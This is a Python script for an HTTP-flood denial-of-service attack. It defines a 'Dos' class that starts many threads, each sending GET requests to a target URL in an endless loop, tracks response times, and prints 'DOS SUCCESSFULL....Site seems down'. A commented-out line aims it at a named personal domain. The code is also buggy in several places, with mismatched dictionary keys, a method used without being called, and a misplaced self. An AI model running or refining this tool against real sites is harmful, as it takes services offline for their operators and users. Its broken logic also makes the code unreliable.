from urllib import response
import requests
import threading 
import time
import sys
import signal
import os
import psutil


class Dos():
    
    def currentMilliTime(self):
        return round(time.time() * 1000)

    def currentSecTime(self):
        return round(time.time())

    def countRequestPerSec(self):
        t=self.currentSecTime()
        
        self.rl.append({
            "time_received ":t
        })
        for e in self.rl:
            if self.currentSecTime - e['time_received'] >= 1:
                self.rl.remove(e)

    def countResponsePerSec(self,timeTook):
        t=self.currentSecTime()
        self.l =[]
        self.l.append({
            "time_took":timeTook,#total no of time
            "time_received ":t
        })
        for e in self.l:
            if self.currentSecTime - e['time_received'] >= 1:
                self.l.remove(e)



    def kill_child_processes(parent_pid, sig=signal.SIGTERM):
        try:
            parent = psutil.Process(parent_pid)
        except psutil.NoSuchProcess:
            return
        children = parent.children(recursive=True)
        print('Process Killed!')
        for process in children:
            process.send_signal(sig)
    
    

    def makeAProperExit(self):
        self.lock.release()
        self.kill_child_processes(self.pid)
        sys.exit(0)

    def makeRequest(self,name):#name->threadId
        try:
            self.countRequestPerSec()
            while True:
                s=self.currentMilliTime()
                r =requests.get(self.target)
                t=self.currentMilliTime() - s #time taken to make one request
                self.countResponsePerSec(t)
        except ConnectionError as e:
            print("DOS Successfull")
        except (KeyboardInterrupt, SystemExit):
            self.makeAProperExit()
            
    def afterInit(self):
        """function to calculate and watch the site is down or not
        """
        print("calculating .......")#need to give some time to send request
        
        while True:
            time.sleep(1)
            responseTime=0
            for e in self.l:
                responseTime= responseTime + e['time_took']

            if(len(self.l))>0:
                responseTime =responseTime /len(self.l)

            if responseTime > 60000:
                self.message ="DOS SUCCESSFULL....Site seems down"
            else:
                self.message ="DOSing........"
                
            print("\rAverage response time: {}ms; Requests/sec: {}; Responses/sec: {}; {}".format(round(responseTime, 2),len(self.rl), len(self.l), self.message), end="")







    def __init__(self,noOfThread,url):
        self.l =[]#response per second
        self.rl=[]#request per second

        self.noOfThread = noOfThread
        self.target=url
        i=0
        print(self.noOfThread)
        print(url)
        while i<=noOfThread:
            x=threading.Thread(target=self.makeRequest,args=(i,))
            x.start()
            i+=1
        self.afterInit()

#a=Dos(2,"https://karthik.selfmade.lol/")